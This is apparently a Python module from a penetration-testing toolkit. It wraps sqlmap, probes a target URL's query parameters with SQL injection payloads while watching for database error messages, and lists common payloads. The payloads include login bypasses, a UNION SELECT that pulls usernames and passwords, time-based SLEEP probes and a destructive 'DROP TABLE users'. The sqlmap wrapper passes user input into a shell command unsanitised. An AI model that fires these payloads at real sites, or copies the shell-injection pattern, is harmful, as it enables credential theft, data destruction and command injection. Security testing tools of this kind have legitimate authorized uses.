"""SQL Injection tools: sqlmap wrapper + light detection helper."""
from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from rich.console import Console
from rich.table import Table

from core.i18n import t
from core.menu import Menu, MenuItem
from core.utils import (
    ask_confirm,
    ask_input,
    check_command_exists,
    pause,
    print_error,
    print_info,
    print_success,
    print_warning,
    run_command,
)

console = Console()


DETECTION_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1-- -",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "' UNION SELECT NULL-- ",
    "1' AND SLEEP(0)-- ",
    "admin' -- ",
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()",
    "pg::syntaxerror",
    "sqlite3::",
    "psql: error",
    "ora-00933",
    "ora-00921",
    "microsoft odbc",
    "microsoft sql server",
    "sqlstate",
    "odbc driver",
    "native client",
]

COMMON_PAYLOADS = [
    "' OR 1=1-- -",
    "admin'-- -",
    "' OR 'a'='a",
    "\" OR \"\"=\"",
    "' UNION SELECT 1,2,3-- -",
    "' UNION SELECT username, password FROM users-- -",
    "1; DROP TABLE users-- -   # DESTRUCTIVE - DO NOT USE without authorization",
    "' AND 1=CONVERT(int,(SELECT @@version))-- ",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- ",
    "' AND SLEEP(5)-- -",
    "1) OR SLEEP(5)-- -",
]


def sqlmap_wrapper() -> None:
    if not check_command_exists("sqlmap"):
        print_error(t("ui.missing_tool", tool="sqlmap"))
        print_warning(t("ui.missing_tool_hint"))
        print_info("pip install sqlmap   OR   https://sqlmap.org/")
        pause()
        return
    url = ask_input(t("ui.url"))
    if not url:
        return
    print_warning(t("ui.warning_legal"))
    if not ask_confirm(t("ui.continue_confirm"), default=False):
        return
    options = ask_input(t("modules.sql_injection.sqlmap_options"),
                       default="--batch --random-agent")
    run_command(f'sqlmap -u "{url}" {options}', shell=True)
    pause()


def quick_detect() -> None:
    try:
        import requests
    except ImportError:
        print_error("requests not installed. Run: pip install requests")
        pause()
        return
    url = ask_input(t("ui.url"))
    if not url:
        return
    print_warning(t("ui.warning_legal"))
    if not ask_confirm(t("ui.continue_confirm"), default=False):
        return

    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        print_error("URL has no query parameters to test.")
        pause()
        return

    findings: list[tuple[str, str, str]] = []
    session = requests.Session()
    session.headers.update({"User-Agent": "PENETRATOR/1.0"})

    for param in params:
        for payload in DETECTION_PAYLOADS:
            mutated = dict(params)
            mutated[param] = params[param] + payload
            test_url = urlunparse(parsed._replace(query=urlencode(mutated)))
            print_info(t("modules.sql_injection.testing_payload", payload=payload))
            try:
                resp = session.get(test_url, timeout=10, allow_redirects=False)
            except requests.RequestException:
                continue
            body_lower = resp.text.lower()
            for signature in ERROR_SIGNATURES:
                if signature in body_lower:
                    findings.append((param, payload, signature))
                    print_success(
                        t("modules.sql_injection.detection_result", indicator=signature)
                    )
                    break

    if findings:
        table = Table(title=t("ui.results"), border_style="green")
        table.add_column("Parameter", style="cyan")
        table.add_column("Payload", style="yellow")
        table.add_column("Indicator", style="red")
        for param, payload, indicator in findings:
            table.add_row(param, payload, indicator)
        console.print(table)
    else:
        print_warning(t("modules.sql_injection.no_indicator"))
    pause()


def payload_list() -> None:
    table = Table(title=t("modules.sql_injection.payload_list"), border_style="cyan")
    table.add_column("#", justify="right", style="cyan")
    table.add_column("Payload", style="white")
    for idx, payload in enumerate(COMMON_PAYLOADS, start=1):
        table.add_row(str(idx), payload)
    console.print(table)
    pause()


def build_menu(parent: Menu | None = None) -> Menu:
    menu = Menu(title_key="modules.sql_injection.title", parent=parent)
    menu.add(MenuItem("modules.sql_injection.sqlmap", sqlmap_wrapper,
                      "modules.sql_injection.sqlmap_desc"))
    menu.add(MenuItem("modules.sql_injection.detect", quick_detect,
                      "modules.sql_injection.detect_desc"))
    menu.add(MenuItem("modules.sql_injection.payload_list", payload_list,
                      "modules.sql_injection.payload_list_desc"))
    return menu
